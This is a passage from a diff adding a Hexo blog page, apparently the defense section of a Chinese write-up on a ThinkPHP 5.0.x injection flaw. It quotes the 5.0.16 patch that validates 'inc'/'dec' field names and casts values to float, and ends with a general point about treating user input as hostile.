分析并处理数据</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseData</span>(<span class="variable">$data</span>, <span class="variable">$options</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x04-防御"><a href="#0x04-防御" class="headerlink" title="0x04 防御"></a>0x04 防御</h3><p>thinkphp在5.0.16版本修复了这个漏洞，并没有在<code>filterExp</code>函数中增加过滤，补丁如下:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$val</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$val</span>[<span class="number">0</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;exp&#x27;</span>:</span><br><span class="line">            <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="variable">$val</span>[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;inc&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$key</span> == <span class="variable">$val</span>[<span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$val</span>[<span class="number">1</span>]) . <span class="string">&#x27;+&#x27;</span> . <span class="title function_ invoke__">floatval</span>(<span class="variable">$val</span>[<span class="number">2</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;dec&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$key</span> == <span class="variable">$val</span>[<span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$val</span>[<span class="number">1</span>]) . <span class="string">&#x27;-&#x27;</span> . <span class="title function_ invoke__">floatval</span>(<span class="variable">$val</span>[<span class="number">2</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>加了一个判断，保证<code>$val[1]</code>为对应的字段名，并且把<code>$val[2]</code>进行了强制类型转换。</p>
+<p>最后说一句，漏洞的利用是建立在thinkphp<strong>接受数组形式的参数</strong>的基础上，虽然这种写法在查询中非常少见，但是在更新、插入的时候还是有相应的需求的。总而言之，一切用户输入都是有害的，还是那句话，框架只是简化开发的一种工具，并不能把应用安全全部交给框架来处理。</p>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+        <div id="lv-container"></div>
+        <div class="giscus"></div>
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>  Theme <a target="_blank" rel="noopener" href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = ""
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+<script src="/js/index.js"></script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+</html>
